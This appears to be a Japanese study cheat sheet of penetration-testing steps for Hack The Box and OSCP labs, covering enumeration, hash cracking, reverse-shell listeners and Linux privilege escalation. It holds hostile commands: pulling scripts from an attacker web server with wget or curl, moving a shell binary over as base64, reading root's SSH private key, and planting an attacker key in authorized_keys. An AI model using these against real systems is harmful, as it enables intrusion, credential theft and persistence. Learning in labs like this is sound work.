## Enumeration (列挙)

### ターゲットのOSを知る
```bash
ping -c 1 <IP>
````

- ttlの時間で判別する
    - `ttl=64` → Linux OS/Mac OS
    - `ttl=128` → Windows OS
    - `ttl=255` → UNIX OS/ネットワーク機器


### ターゲットの詳細なOSを知る
OpenSSHのバージョンを検索して、OSの詳細なバージョンを知る。
opensshのバージョンは、こんな感じで出てくる
```shell-session
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
```
「OpenSSH 8.2p1 Ubuntu 4ubuntu0.1」を検索
「launchpad.net」というサイトの中で、Ubuntu SSHパッケージの変更ログから、「openssh 1:8.2p1-4ubuntu0.1」とわかる
「ubuntuupdates.org」というサイトの中で「Release:	focal (20.04)」から、対象のOSはUbuntu 20.04とわかる。
→古いバージョンの OS に新しいアプリケーション パッケージをインストールすることも可能だから、あまり信用しすぎない。

---

### nmapポートスキャン

```bash
sudo nmap -vvv -sCV -T4 -p0-65535 -Pn <IP>
```
- `-vvv`
    - 詳細な出力を有効化する（デバッグ情報を増やす）。
    - `-v` で基本的な詳細情報を表示、`-vv` でより詳細、`-vvv` で最も詳細な出力となる。
- `-sCV`
    - `-sC`: Nmapのデフォルトスクリプトを実行する。
        - これにより、サービス検出や脆弱性スキャンが行われることがある。
    - `-sV`: サービスバージョンを検出する。
        - 各ポートで動作しているサービスのバージョン情報を取得しようとする。
        - 例えば、`Apache 2.4.41` などの詳細な情報が得られることがある。

---

### Webサーバ上のディレクトリ列挙

- 特定のページにアクセスできる隠しファイルやフォルダを見つけるのに最適
### Feroxbuster 
えぐいディレクトリスキャナー
一つの隠しフォルダ見つけたら、その中で再起的にディレクトリスキャンしてくれる
```bash
feroxbuster -u <http://TARGET>
```

### Dirsearch
HTBにはdirsearch入ってないので、dirsearchを入れるところから
```bash
sudo apt install dirsearch -y
```

両方大事
```bash
dirsearch -u <domain> -t 50 -i 200
```

```bash
sudo dirsearch --url=http://popcorn.htb --wordlist=/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --threads 30 --random-agent --format=simple
```

### ffuf
サブディレクトリの検索に使える
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://<domain> -H "Host: FUZZ.<domain>" -mc 200
```
 - 注意点としては、サブドメインにも、hostsで設定しないとサーバーエラーになる```
- `-mc 200`で、フィルタリングしてるのに、全部200でバーっと出てくる時は、`-fs`でサイズでフィルタリングするといい感じになる

---

### VHOST（仮想ホスト）の列挙

```bash
gobuster vhost -u http://<IP> -w /usr/share/wordlists/vhosts.txt
```

### Whatweb
```
whatweb <http://...>
```
便利なツールであり、ネットワーク全体の Web アプリケーションの列挙を自動化する多くの機能を備えている
```shell-session
whatweb --no-errors 10.10.10.0/24
```

### robots.txt
robots.txtが見つかったら、disallowに注目する

### EyeWitness
ターゲットWebアプリケーションのスクリーンショットを撮り、指紋を取得し、可能なデフォルトの資格情報を識別するために使用できる
https://github.com/RedSiege/EyeWitness

---

### サイト脆弱性スキャン

```bash
nikto -h http://<IP>
```

### FTP匿名ログイン

```bash
ftp -p <IP>
```

- ユーザー名: `anonymous` または `ftp`
- パスワード: 空欄でEnter

### SMB

SMBからOSのバージョンを検出する
```shell-session
nmap --script smb-os-discovery.nse -p445 10.10.10.40
```
Windows 7 OS を実行しており、さらに列挙を行って EternalBlue に対して脆弱であるかどうかを確認できる

```shell-session
smbclient -N -L \\\\<IP>
```
SMB を使用すると、ユーザーと管理者はフォルダーを共有し、他のユーザーがリモートでアクセスできるようにすることができます。多くの場合、これらの共有には、パスワードなどの機密情報を含むファイルが含まれています。SMB 共有を列挙して操作できるツールは[smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)です。`-L`フラグは、リモート ホストで使用可能な共有の一覧を取得することを指定しますが、`-N`パスワード プロンプトは表示されません。

デフォルト以外の共有`users`を表示する。ゲストユーザーとして接続する
```shell-session
smbclient \\\\10.129.42.253\\users
```


ユーザーbobとしてログインする
```shell-session
smbclient -U bob \\\\10.129.42.253\\users
```



### SNMP
- SNMP（Simple Network Management Protocol）
- ネットワーク機器（ルーター、スイッチ、サーバーなど）の状態を監視・管理するためのプロトコル。ネットワーク管理者がデバイスの情報を取得したり、設定を変更したりするのに使う
- `public`と`private`のメーカーのデフォルトのコミュニティ文字列は、多くの場合、変更されない
- SNMP バージョン 1 と 2c  : 名前がわかっていれば、アクセスできる。
- SNMPのバージョン
	- v1 → 最も古い（認証はIPアドレスベース）
	- v2c → よく使われる（コミュニティストリングによる認証）
	- v3 → セキュリティ強化版（認証と暗号化あり）

10.129.42.253 のホスト名を SNMP で取得する
```
snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
```
- snmpwalk → SNMPエージェント（デバイス）に問い合わせて、階層的なデータを取得するコマンド
- -v 2c → SNMPのバージョン2cを使用
- -c public → コミュニティストリング（パスワードみたいなもの）が "public"
- 10.129.42.253 → SNMPエージェント（対象デバイス）のIPアドレス
- 1.3.6.1.2.1.1.5.0 → OID（オブジェクト識別子）（取得したいデータを指定）
	- OID（Object Identifier）は、SNMPで取得できる情報の「アドレス」みたいなもの。
	- 1.3.6.1.2.1.1.5.0 → デバイスのホスト名（sysName）
	- 1.3.6.1.2.1.1.1.0 → デバイスの説明（sysDescr）
	- 1.3.6.1.2.1.2.2.1.2 → インターフェース一覧（ifDescr）

[onesixtyone](https://github.com/trailofbits/onesixtyone)などのツールを使用する`dict.txt`と、ツールの GitHub リポジトリに含まれているファイルなどの一般的なコミュニティ文字列の辞書ファイルを使用して、コミュニティ文字列名をブルート フォース攻撃できる
```shell-session
onesixtyone -c dict.txt 10.129.42.254
```

---
## 脆弱性の探索

### .Gitが見つかったら

- .gitがあったら、.git/logs/HEADを参照したら、remoteのurl出てきたりすることがある
- GitHackを使って、gitファイルをダンプする
	- [https://github.com/lijiejie/GitHack](https://github.com/lijiejie/GitHack)
```bash
git clone https://github.com/lijiejie/GitHack.git
cd GitHack
python GitHack.py http://www.openssl.org/.git/
```

### XSS (Cross Site Script)

HTBやOSCPではXSSの脆弱性を使うことはないため、真っ先に除外する。  
XSSは他のユーザーが引っかかる必要があるが、HTBやOSCPには対象が存在しない。
- わけではないこともあることがわかった。SeaはXSSからのRCEで侵入できる。

### Searchsploit
#### 複数の脆弱性を見つけたとき
 .txtよりもコードが書かれた脆弱性を選ぶべき
 迷った時は数字が後の方の方を選ぶべし
	 より最新で、上手くいく可能性が高いから

- searchsploitでExploitDBのリンクも表示するオプション
- でも、これつけるとローカルでの場所が表示されなくなっちゃう😢
  ```bash
  searchsploit -w <検索キーワード>
  ```
#### PoCをダウンロードしたい時
 searchsploit -m <脆弱性の番号>
  - -m : ミラー
#### 使い方だけ出力したい
	 | grep -i usage <PoC file>

- Authenticated~系は、攻撃者がログインした後にできる攻撃なので、ログインしてないと無理
### Searchsploitだけで全てだと思わない。Google検索もする
検索キーワード　: `SoftwareName Version CVE`




---

## Exploit

### 侵入のための足がかり
#### ステガノグラフィーツール
CTFでは、意味ありげな画像がポンと渡されて、何も情報がない場合、ステガノグラフィーのこともある。

ファイルの埋め込み
```bash
steghide embed -cf cvr.jpg -ef emb.txt
```
データの抽出:
```bash
steghide extract -sf stg.jpg
```
##### パスフレーズがかかってて、突破できない時
1. 何が入ってるのかを確認する
```bash
sudo apt install stegcracker -y
sudo apt install steghide -y
sudo steghide info *.jpg
```
2. 何も入力しないでEnterを押すことで突破できないか試す
```bash
sudo steghide extract -sf *.jpg
```
3. ヒントの確認
	- 隠されたパスフレーズがファイルのメタデータや埋め込まれたコメントに含まれている場合がある。以下のコマンドでチェック
```bash
strings HackerAccessGranted.jpg
exiftool HackerAccessGranted.jpg
```
4. 辞書攻撃
	- よく使用される辞書ファイル
	- `rockyou.txt`（多くのステガノグラフィー攻撃で利用される）
```bash
stegcracker HackerAccessGranted.jpg /path/to/wordlist.txt
```
 
#### 文字の画像などでモザイクがかかってて複合したい時
 - [https://github.com/spipm/Depix.git]を使う
 ```sh
git clone https://github.com/spipm/Depix.git
cd Depix
 ```

```
python3 depix.py -p <PATHTOIMAGE>/image.png -s
./images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o
<DESIREDPATH>/output.png
```
#### 攻撃者側のサーバー内のファイルをやられ側に移す
##### PythonでHTTP

 ```bash
python3 -m http.server 8080
 ```

  攻撃者サーバーを一時的にwebサーバーとする

- wgetとかcurlコマンドでダウンロード
```shell-session
user@remotehost$ wget http://10.10.14.1:8000/linenum.sh
```
```shell-session
user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

##### SCPを使う
リモートホストでsshユーザー資格情報を取得した場合、`scp`を使用することでファイルのやり取りできる
```shell-session
snowyowl644@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh
```

##### Base64の使用
マシンによっては、ファイルをダウンロードするときにファイアーウォールがあって、正常にダウンロードできない時もある
簡単なトリックを使用してファイルを`base64`形式にエンコードし、`base64`文字列をリモートサーバーに貼り付けてデコードすることでファイルの受け渡しができる
↓shellというファイルをダウンロード
```shell-session
snowyowl644@htb[/htb]$ base64 shell -w 0
```
この`base64`文字列をコピーしてリモートホストに移動し、`base64 -d`を使用してデコードし、出力をファイルにパイプする
```shell-session
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

#### SMTPサーバーを建てる
- Kali LinuxでSMTPサーバーを構築するには、Postfixなどのメールサーバーソフトウェアで立てる
まずインストールする
```bash
sudo apt update
sudo apt install postfix
```
簡単な設定する
```bash
sudo nano /etc/postfix/main.cf
```

```bash
myhostname = mail.example.com  # サーバーのホスト名
mydomain = example.com         # ドメイン名
myorigin = $mydomain
inet_interfaces = all          # 外部からの接続を許可
inet_protocols = ipv4          # IPv4のみを使用
mydestination = $myhostname, localhost.$mydomain, localhost, $mydomain
mynetworks = 127.0.0.0/8       # 接続を許可するネットワーク（適宜変更）
relayhost =                    # リレー先（空の場合は直接送信）
```

設定を適用するためにPostfixの再起動する
```bash
sudo systemctl restart postfix
sudo systemctl enable postfix
```

####  johnを使いたい時
**単純なハッシュ**
1. hashes.txtに直す
```bash
echo "ハッシュ" > hashes.txt
```
2. ハッシュの形式を指定して、johnを使って解析
```bash
john --format=raw-sha512 hashes.txt
```

ハッシュの形式が不明な場合
```bash
hashid -m 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163'
```

**複雑な形式**
1. まず自分の目的に合ったjohnのスクリプトを探して、johnが解析できる.johnの形に変換する
```bash
sudo find / -iname *2john* -type f 2>/dev/null
```
2. johnでワードリストを指定して解析
```bash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt 探したい.john
```


---
### リバースシェルの作成
- https://www.revshells.com/

### Metasploit 

#### リバースシェルリスナーの設置

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT <PORT>
set ExitOnSession false
exploit -j -z
```

#### **セッション管理**

#### **セッション一覧表示**

```bash
sessions -l
```

#### **セッション接続・セッションに戻る**

```bash
sessions -i <セッション番号>
```

####  **セッション全終了**
se
```bash
sessions -K
```

#### **特権昇格の発見とエクスプロイト**

##### **local_exploit_suggester を使う**

Mesterpreterでユーザー権限でセッションが確立している時、**`local_exploit_suggester`** モジュールを使用して、ターゲットシステムに適した特権昇格エクスプロイトを提案させることができます。

```bash
ls
```

---

### シェルアップデート
- linux
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
- windows
- 方法 : rlwrap は、コマンドラインの入力履歴や補完機能を提供するラッパープログラムです。これを nc と組み合わせることで、シェルの機能を強化できます。

```bash
rlwrap nc -lvnp <ポート番号>  # リスナー側 (攻撃者マシン)
```

## Lateral Movement
リバースシェルで、ログインした時、最初は、「www-data」であることがある。
その時、www-dataのパスワードがわからないので横展開が必要

- データベース情報を書き換える・新規追加
	- ローカルの空いてるポート見つけるコマンド
		- `netstat -tuln`
	- データベースの種類を見分ける方法
		- **ポート番号3306**は、MySQLまたはMariaDBのデフォルトポート
		- **ポート番号:5432**:PostgreSQL

- HTBでの認証情報の使い回し
	- webのログインで取得したパスワードとサーバー上のユーザーが同じことがある
	- DBの設定ファイルにあるパスワードとsshのパスワードが同じ

- **`/etc/passwd` から有効なシェルを持つユーザーの確認**
	- `/etc/passwd` の最後のフィールドは、**そのユーザーのデフォルトシェル** を示している。  
	- `/bin/bash` ・`/bin/sh`
		-  ユーザーは、**通常のログインが可能**。
		- 横展開先のユーザーに最適
	- **`/usr/sbin/nologin`**
	    - このシェルが設定されているユーザーは、**ログインできない** ように制限されている。
	    - 例えば、`www-data` や `mysql` などのシステムユーザーに設定されている。
	- **`/bin/false`**
	    - これもログインを拒否するための設定。
	    - `false` コマンドは何もせず終了するため、**ログインを試みても即ログアウトする**。
	横展開先のユーザーを探す時に使える。



## 権限昇格
- 現在のユーザーで、sudo コマンドを使用して実行可能なコマンドや権限を確認する
```bash
sudo -l
```
- 正直HTBのEasyとかMediumの一部では、このコマンド打って、NoPasswordって書いてあるスクリプトをsudo権限で実行すれば権限昇格できる。
- たまに、SUIDが設定されているバイナリの脆弱性を使って権限昇格することもある
	- 以下のリストと照らし合わせて、ここにリストされてないユニークなバイナリがあったら、バージョン調べて、脆弱性を探してPoCを刺すこともできそう。

- SUIDで列挙した時に、一般的に設定されているバイナリ
	- そのため、注目すべきは、これ以外のバイナリってこと。
	- ほとんどの Linux でデフォルト設定されているもの
		- `/usr/bin/passwd`
		- `/usr/bin/su`
		- `/usr/bin/sudo`
		- `/usr/bin/mount`
		- `/usr/bin/umount`
		- `/usr/bin/newgrp`
		- `/usr/bin/chsh`
		- `/usr/bin/chfn`
		- `/usr/bin/gpasswd`
		- `/usr/bin/fusermount`
	- 特定の環境や、設定によって含まれることがあるバイナリ
		- `/usr/lib/openssh/ssh-keysign`
		- `/usr/lib/dbus-1.0/dbus-daemon-launch-helper`
		- `/usr/sbin/pppd`
		- `/usr/lib/xorg/Xorg.wrap`

- ここにまとまってるから、あとでまとめる
	- https://scrapbox.io/tadanomemo777/Linux_%E6%A8%A9%E9%99%90%E6%98%87%E6%A0%BC

- 権限昇格で使えるチェックリスト
	- [HackTricks](https://book.hacktricks.xyz/) 
		- [Linux](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html) と [Windows](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html) の両方のローカル特権の昇格に関する優れたチェックリストである
	- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) 
		- [Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md) と [Windows](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md) の両方のチェックリストがある

- 自動列挙ツール
	- 上記のコマンドの多くは、レポートを調べて弱点を探すためにスクリプトで自動的に実行される場合がある
	- 興味深い結果を返す一般的なコマンドを実行することで、多くのスクリプトを実行してサーバーを自動的に列挙できる
	- 一般的な Linux 列挙スクリプトには、[LinEnum](https://github.com/rebootuser/LinEnum.git) と [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker) があり、Windows には [Seatbelt](https://github.com/GhostPack/Seatbelt) と [JAWS ](https://github.com/411Hall/JAWS)がある。
	- [Privilege Escalation Awesome Scripts SUITE（PEASS）](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
		- 最新の状態に保つために適切に維持されており、LinuxとWindowsの両方を列挙するためのスクリプトが含まれている
	しかし、自動列挙ツールはウイルス対策ソフトウェアまたはセキュリティ監視ソフトウェアをトリガーする可能性のある多くの「ノイズ」を生成するので、スクリプトの実行が妨げられたり、システムが侵害されたというアラームがトリガーされたりする可能性がある。場合によっては、スクリプトを実行する代わりに手動列挙を実行する必要がある。

これらのスクリプトの出力で、探すべき脆弱性
- カーネルエクスプロイト
	- 普通にバージョンが古いOSだと、パッチが当たってないから、脆弱性になりうる
- 脆弱なソフトウェア
	- linux : `dpkg -l`
		- インストールされているソフトウェアが、古いバージョンの時、脆弱性がある場合がある。
	- Windows : `C:\Program Files`以下を見る
- ユーザー権限
	- Sudo
		- `sudo -l`
			- (ALL : ALL) ALL 
				- `sudo`ですべてのコマンドを実行でき、完全なアクセス権を与え、`sudo`で`su`コマンドを使用してルートユーザーに切り替えることができると述べています。
			- (user : user) NOPASSWD: /bin/echo
				- `sudo`でコマンドを実行するにはパスワードが必要です。特定のアプリケーション、またはすべてのアプリケーションをパスワードなしで実行できる場合があり
	- SUID
		- SUID バイナリ (Set User ID) を検索して一覧表示する
		- `find / -type f -perm -04000 -ls 2>/dev/null`
	- Windows Token Privileges
		-  GTFOBins : https://gtfobins.github.io
		- Windows版 GTFOBins : https://lolbas-project.github.io/#


スケジュールされたタスク
- スケジュールされたタスク（Windows）またはcronジョブ（Linux）を利用して特権をエスカレーションするには、通常2つの方法があります。
	- 新しいスケジュールされたタスク/cronジョブを追加する
	- 悪意のあるソフトウェアを実行するように彼らをだます
	- 新しいスケジュールされたタスクを追加できるかどうかを確認する
		- /etc/crontab
		- /etc/cron.d
		- /var/spool/cron/crontabs/root
		- cronジョブによって呼び出されたディレクトリに書き込むことができれば、実行時にリバースシェルを送信するリバースシェルコマンドでbashスクリプトを記述できる

SSHキー
- 特定のユーザーの .ssh を読み取れるアクセス権がある場合
	- 以下のプライベート ssh キーを参照・コピー
		- `cat /root/.ssh/id_rsa`
		- `cat /user1/.ssh/id_rsa`
	- ローカルにペースト・権限を与える
		- `nano id_rsa`
		- `chmod 600 id_rsa`
	- ローカルから接続
		- `ssh root@94.237.53.117 -p 53658 -i id_rsa`

ユーザー`/.ssh/`ディレクトリへの書き込みアクセス権がある場合
- ユーザーのsshディレクトリの/home/user/.ssh/authorized_keysに公開鍵を配置
- 出力ファイルを指定するには、まず ssh-keygen と -f フラグで新しいキーを作成する
```shell-session
#攻撃者PC
ssh-keygen -f key
```
- `key`（`ssh -i`で使用します）と`key.pub`の2つのファイル
- `key.pub`をコピーして、リモートマシンで`/root/.ssh/authorized_keys`に追加
- 被害者PCで実行
```shell-session
echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
```
- これで、リモートサーバーは、秘密鍵を使用してそのユーザーとしてログインできるはず
```shell-session
snowyowl644@htb[/htb]$ ssh root@10.10.10.10 -i key

root@remotehost# 
```



---

## フラグの検索

- ファイル名が`user.txt`の場合

```bas
find / -type f -iname "user.txt" 2>/dev/null
```

- ファイル名が`root.txt`の場合

```bash
find / -type f -iname "root.txt" 2>/dev/null
```

`grep`を使用して特定の文字列を含むファイルを検索

もし、ディレクトリ内のファイルの中身を再帰的に検索する場合

- `user`という文字列を検索（大文字・小文字を無視）

```bash
grep -ri "user" / 2>/dev/null
```

- `root`という文字列を検索（大文字・小文字を無視）

```bash
grep -ri "root" / 2>/dev/null
```





